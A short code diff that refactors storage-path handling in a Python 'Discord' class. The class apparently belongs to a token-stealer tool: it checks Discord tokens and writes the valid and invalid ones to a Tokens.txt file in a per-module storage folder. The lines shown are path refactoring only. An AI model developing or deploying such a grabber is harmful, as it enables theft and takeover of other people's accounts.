@@ -14,9 +14,7 @@ class Discord:
     """
     def __init__(self, storage_path: str, folder: str):
 
-        self.__storage_path = storage_path
-        self.__folder = folder
-
+        self.__full_path = path.join(storage_path, folder)
         self.__config = DiscordConfig()
 
     def __create_folder(self) -> None:
@@ -24,10 +22,8 @@ class Discord:
         Creates storage for the Discord module.
         :return: None
         """
-        folder = rf"{self.__storage_path}\{self.__folder}"
-
-        if not path.exists(folder):
-            makedirs(folder)
+        if not path.exists(self.__full_path):
+            makedirs(self.__full_path)
 
     def __get_headers(self, token: str = None, content_type: str = "application/json") -> dict:
         """
@@ -110,7 +106,7 @@ class Discord:
                 result[0]
             ))
 
-        with open(rf"{self.__storage_path}\{self.__folder}\Tokens.txt", "a", encoding="utf-8") as discord:
+        with open(path.join(self.__full_path, "Tokens.txt"), "a", encoding="utf-8") as discord:
 
             discord.write("Invalid tokens:\n" + "\n".join(item for item in self.invalid) + "\n\nValid tokens:\n")
             discord.write("".join(item for item in temp))
